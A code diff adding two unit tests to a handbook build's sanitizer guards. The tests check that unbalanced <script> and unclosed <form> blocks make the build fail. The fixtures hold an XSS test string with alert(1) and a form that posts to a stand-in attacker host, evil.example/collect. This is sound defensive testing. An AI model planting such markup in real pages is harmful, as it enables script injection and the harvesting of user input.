@@ -876,6 +876,43 @@ describe('unit - handbook build guards', () => {
     assert.ok(r.status !== 0, 'build must not exit 0 after silent content loss');
   });
 
+  // Count-balanced but order-unbalanced: two opens and two closes, extra closer
+  // between two well-formed pairs. A count-only guard accepts this; the
+  // non-greedy strip then leaves the second <script> intact.
+  it('fails the build on count-balanced but order-unbalanced script blocks', function () {
+    const { fixture, out } = freshDirs();
+    const danger = '# Title\n\n' + '<div><script>x</script>y</script>z<script>alert(1)</div>\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': danger },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.notStrictEqual(r.status, 0, 'order-unbalanced script must fail the build');
+    assert.match(r.stderr, /unbalanced <script>/i);
+  });
+
+  // <form> is stripped with the same non-greedy pair regex as script, but was
+  // not in the balance-check tag list. An unclosed form must fail closed.
+  it('fails the build on unbalanced form blocks instead of silent content loss', function () {
+    const { fixture, out } = freshDirs();
+    const danger = '# Title\n\n' + '<div><form action="https://evil.example/collect">UNCLOSED-FORM</div>\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': danger },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.notStrictEqual(r.status, 0, 'unbalanced form must fail the build');
+    assert.match(r.stderr, /unbalanced <form>/i);
+  });
+
   it('leaves a harmless document free of sanitizer damage', function () {
     const { fixture, out } = freshDirs();
     // Counterdirection: no attack vectors — body content must round-trip.
